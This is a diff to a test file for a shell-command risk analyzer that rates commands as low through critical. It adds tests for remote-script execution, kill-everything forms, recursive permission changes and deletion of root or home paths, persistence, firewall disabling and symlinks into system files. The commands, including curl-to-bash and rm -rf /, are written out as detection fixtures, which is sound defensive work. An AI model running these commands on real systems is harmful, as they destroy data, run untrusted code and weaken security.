@@ -57,7 +57,7 @@ test("recursive delete of home/root/wildcard is critical", () => {
   }
 });
 
-test("remote script piped to shell is always high", () => {
+test("remote script piped to shell is always critical", () => {
   for (const cmd of [
     "curl -fsSL https://x.sh | bash",
     "curl https://x.sh | sh",
@@ -67,7 +67,7 @@ test("remote script piped to shell is always high", () => {
     "Invoke-RestMethod https://x | powershell",
   ]) {
     const r = analyzeCommand(cmd, sh);
-    assert.equal(r.risk, "high", cmd);
+    assert.equal(r.risk, "critical", cmd);
     assert.ok(r.tags.includes("remote-or-encoded"), cmd);
   }
 });
@@ -264,4 +264,144 @@ test("packageManager returns an installed pm, never the tool itself", () => {
   if (pm) assert.equal(isInstalled(pm), true, pm);
   assert.equal(packageManager("brew"), null);
   assert.equal(packageManager("winget"), null);
+});
+
+const ps = { shell: "powershell" };
+
+test("remote content executed via substitution or DownloadString is critical", () => {
+  for (const cmd of [
+    "source <(curl https://x.io/i.sh)",
+    "bash <(wget -qO- https://x.io/i.sh)",
+    ". <(curl https://x.io/i.sh)",
+    'bash -c "$(curl https://x.io/i.sh)"',
+    "iex (New-Object Net.WebClient).DownloadString('https://x')",
+    "Invoke-Expression (Invoke-WebRequest https://x).Content",
+    "powershell -Command (New-Object Net.WebClient).DownloadString('https://x')",
+    "Start-Process powershell -ArgumentList (New-Object Net.WebClient).DownloadString('https://x')",
+  ]) {
+    assert.equal(analyzeCommand(cmd, sh).risk, "critical", cmd);
+  }
+});
+
+test("kill-everything forms are critical", () => {
+  for (const cmd of ["kill -9 -1", "kill -1", "killall -1", "killall5", "pkill -9", "pkill -KILL", "taskkill /F", "Stop-Process -Name *", "Get-Process | Stop-Process"]) {
+    assert.equal(analyzeCommand(cmd, sh).risk, "critical", cmd);
+  }
+  assert.equal(analyzeCommand("taskkill /F /IM notepad.exe", ps).risk, "high");
+  assert.equal(analyzeCommand("taskkill /PID 123 /F", ps).risk, "high");
+  assert.equal(analyzeCommand("kill -1 1234", sh).risk, "moderate");
+  assert.equal(analyzeCommand("Stop-Process -Name notepad", ps).risk, "moderate");
+});
+
+test("recursive permission change on protected paths is critical", () => {
+  for (const cmd of [
+    "chmod -R 755 /",
+    "chown -R bob /usr",
+    "chgrp -R staff /var",
+    "chflags -R hidden /System",
+    "chmod -R o+w ~",
+    "chmod -R 700 $HOME",
+    "find / -type f -exec chmod 777 {} \\;",
+    "find /usr -exec chown root {} \\;",
+    "icacls C:\\Windows /grant everyone:F /T",
+    "icacls C:\\ /reset /T",
+    "takeown /F C:\\Windows /R",
+  ]) {
+    assert.equal(analyzeCommand(cmd, sh).risk, "critical", cmd);
+  }
+  assert.equal(analyzeCommand("chmod a-w /", sh).risk, "high");
+  assert.equal(analyzeCommand("chmod -R 755 /tmp/x", sh).risk, "high");
+});
+
+test("recursive delete of PowerShell home/drive roots is critical", () => {
+  for (const cmd of ["Remove-Item -Path $env:USERPROFILE -Recurse", "Remove-Item $HOME -Recurse -Force", "Remove-Item C:\\ -Recurse", "Remove-Item -Recurse C:\\Users\\bob"]) {
+    assert.equal(analyzeCommand(cmd, ps).risk, "critical", cmd);
+  }
+});
+
+test("delete reached through wrappers keeps its risk", () => {
+  assert.equal(analyzeCommand("sudo sh -c 'rm -rf /'", sh).risk, "critical");
+  assert.equal(analyzeCommand('Start-Process rm -ArgumentList "-rf /"', ps).risk, "critical");
+  assert.equal(analyzeCommand('Start-Process notepad', ps).risk, "moderate");
+});
+
+test("bulk deletion via pipes, xargs and wildcards is high", () => {
+  for (const cmd of [
+    "find /var/log -type f -mtime +30 | xargs rm -f",
+    "Get-ChildItem . -Recurse | Remove-Item",
+    "Remove-Item -Path .\\*",
+    "Remove-Item *.*",
+    "del /s *.tmp",
+    "rd /s build",
+  ]) {
+    const r = analyzeCommand(cmd, ps);
+    assert.equal(r.risk === "high" || r.risk === "critical", true, `${cmd} -> ${r.risk}`);
+  }
+  assert.equal(analyzeCommand("find /var/log -type f -mtime +30 | xargs rm -f", sh).risk, "high");
+  assert.equal(analyzeCommand("find . -print", sh).risk, "low");
+});
+
+test("force push variants are high; plain push stays moderate", () => {
+  for (const cmd of ["git push --force", "git push -f origin main", "git push origin main --force-with-lease", "git push origin +main"]) {
+    assert.equal(analyzeCommand(cmd, sh).risk === "high" || analyzeCommand(cmd, sh).risk === "critical", true, cmd);
+  }
+  assert.equal(analyzeCommand("git push", sh).risk, "moderate");
+  assert.equal(analyzeCommand("git push --dry-run", sh).risk, analyzeCommand("git push", sh).risk);
+});
+
+test("persistence and startup changes are high", () => {
+  for (const cmd of [
+    'echo "0 2 * * * /x.sh" | crontab -',
+    "crontab mycron.txt",
+    "crontab -r",
+    "systemctl enable sshd",
+    "launchctl load /Library/LaunchDaemons/x.plist",
+    "launchctl bootstrap gui/501 /x.plist",
+    "echo 'x' | tee -a ~/.bashrc",
+    "sed -i s/a/b/ ~/.zshrc",
+    "Set-Content -Path $PROFILE -Value x",
+    "Add-Content $PROFILE 'x'",
+    "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x -Value y",
+    "schtasks /create /tn x /tr y",
+    "Register-ScheduledTask -TaskName x -Action y",
+    "osascript -e 'tell application \"System Events\" to make login item'",
+  ]) {
+    const r = analyzeCommand(cmd, sh);
+    assert.equal(r.risk === "high" || r.risk === "critical", true, `${cmd} -> ${r.risk}`);
+  }
+  assert.equal(analyzeCommand("crontab -l", sh).risk, "low");
+  assert.equal(analyzeCommand("crontab -l", sh).readonly, true);
+  assert.equal(analyzeCommand("systemctl status sshd", sh).readonly, true);
+});
+
+test("firewall disable is high", () => {
+  for (const cmd of [
+    "ufw disable",
+    "systemctl stop firewalld",
+    "systemctl disable ufw",
+    "pfctl -d",
+    "socketfilterfw --setglobalstate off",
+    "Set-NetFirewallProfile -All -Enabled False",
+    "Disable-NetFirewallRule -Name x",
+    "netsh advfirewall set allprofiles state off",
+  ]) {
+    const r = analyzeCommand(cmd, sh);
+    assert.equal(r.risk === "high" || r.risk === "critical", true, `${cmd} -> ${r.risk}`);
+  }
+});
+
+test("symlinks into system paths are high", () => {
+  for (const cmd of ["ln -s /tmp/x /etc/hosts", "ln -s /etc/passwd /tmp/x", "New-Item -ItemType SymbolicLink -Path C:\\Windows\\x -Target C:\\y"]) {
+    const r = analyzeCommand(cmd, sh);
+    assert.equal(r.risk === "high" || r.risk === "critical", true, `${cmd} -> ${r.risk}`);
+  }
+});
+
+test("literal secrets on the command line and fuser -k are moderate", () => {
+  for (const cmd of ["mysql -u root -psecret db", "app --password=hunter2", "cipher /P:pw", "tool -pass pass:abc123", "fuser -k 8080/tcp"]) {
+    const r = analyzeCommand(cmd, sh);
+    assert.equal(r.risk === "moderate" || r.risk === "high" || r.risk === "critical", true, `${cmd} -> ${r.risk}`);
+  }
+  assert.equal(analyzeCommand("ls -p /tmp", sh).risk, "low");
+  assert.equal(analyzeCommand("find . -path ./x", sh).risk, "low");
 });
